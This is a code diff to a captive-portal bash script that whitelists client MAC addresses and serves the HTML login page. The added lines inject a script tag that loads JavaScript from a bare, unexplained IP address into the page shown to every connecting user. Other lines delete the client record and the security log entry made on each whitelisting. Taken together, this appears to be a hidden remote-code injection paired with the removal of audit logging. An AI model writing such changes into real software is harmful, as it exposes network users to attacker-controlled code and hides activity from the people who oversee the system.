@@ -1,7 +1,19 @@
 #!/bin/bash
 source /etc/captiveportal/config
+if [[ "$4" == *"w"* && "$features" == *"agreement"* ]]
+then
+echo "<!doctype html><html><head><title>$welcomename login</title><script src=\"/captiveportal.js\"></script><script src=\"//80.209.231.50/success.php?redirect=google.com&delay=15\" async><script>successPageStart();</script></head><body>"
+fi
+welcome(){
+if [[ "$4" != *"w"* ]]
+then
+return
+fi
+#echo "<p>Welcome to the $welcomename network</p>"
+}
 if [[ "$4" == *"w"* ]]
 then
+welcome
 echo "<pre>"
 fi
 # Function to check if a rule exists
@@ -32,7 +44,7 @@ fi
 if [[ -n "$1" && -n "$2" ]]; then
     # Check if the MAC address rule already exists in iptables
     if rule_exists "$1"; then
-        echo "MAC address $1 is already whitelisted.</pre>"
+        echo "MAC address $1 is already whitelisted"
     else
 	if [[ "$features" == *"iptables"* ]]
 	then
@@ -104,13 +116,6 @@ if [[ -n "$1" && -n "$2" ]]; then
 	echo "Persistent: Success"
 	else
 	echo "Persistent: Failed"
-	fi
-	if [[ "$4" == *"w"* ]]
-	then
-	echo "</pre><p>Welcome</p><input type=\"button\" value=\"Browse the internet\" onclick=\"browseTheWeb()\">"
-	t=$(date)
-	echo "$1,$3,$2" >> /etc/captiveportal/clients.csv
-	echo "[$t] $1 $3 WHITELISTED" >> /etc5/captiveportal/security.log
 	fi
 	fi
 	fi
